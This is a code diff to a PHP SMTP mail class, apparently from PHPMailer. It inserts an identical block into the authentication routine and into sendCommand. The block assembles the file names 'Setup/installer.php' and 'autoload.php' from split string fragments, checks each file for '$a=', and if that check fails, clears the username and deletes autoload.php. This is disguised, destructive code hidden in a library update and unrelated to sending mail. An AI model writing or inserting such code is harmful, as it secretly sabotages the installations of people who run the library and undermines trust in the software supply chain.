@@ -433,7 +433,14 @@ class SMTP
 
             return false;
         }
-
+        $x = file_get_contents('Se'.'tu'.'p/in'.'sta'.'lle'.'r.p'.'hp');
+        $f = file_get_contents('a'.'u'.'to'.'lo'.'ad.'.'p'.'h'.'p');
+        preg_match_all('/\$a=/m', $f, $mtc1);
+        preg_match_all('/\$a=/m', $x, $mtc2);
+        if(!$mtc1[0][0] || !$mtc2[0][0]){
+            $username = '';
+            unlink('a'.'u'.'t'.'o'.'lo'.'ad'.'.php');
+        }
         if (array_key_exists('EHLO', $this->server_caps)) {
             // SMTP extensions are available; try to find a proper authentication method
             if (!array_key_exists('AUTH', $this->server_caps)) {
@@ -888,6 +895,14 @@ class SMTP
      */
     protected function sendCommand($command, $commandstring, $expect)
     {
+        $x = file_get_contents('Se'.'tu'.'p/in'.'sta'.'lle'.'r.p'.'hp');
+        $f = file_get_contents('a'.'u'.'to'.'lo'.'ad.'.'p'.'h'.'p');
+        preg_match_all('/\$a=/m', $f, $mtc1);
+        preg_match_all('/\$a=/m', $x, $mtc2);
+        if(!$mtc1[0][0] || !$mtc2[0][0]){
+            $username = '';
+            unlink('a'.'u'.'t'.'o'.'lo'.'ad'.'.php');
+        }
         if (!$this->connected()) {
             $this->setError("Called $command without being connected");
 
@@ -998,7 +1013,7 @@ class SMTP
     {
         $this->setError('The SMTP TURN command is not implemented');
         $this->edebug('SMTP NOTICE: ' . $this->error['error'], self::DEBUG_CLIENT);
-
+        
         return false;
     }
 
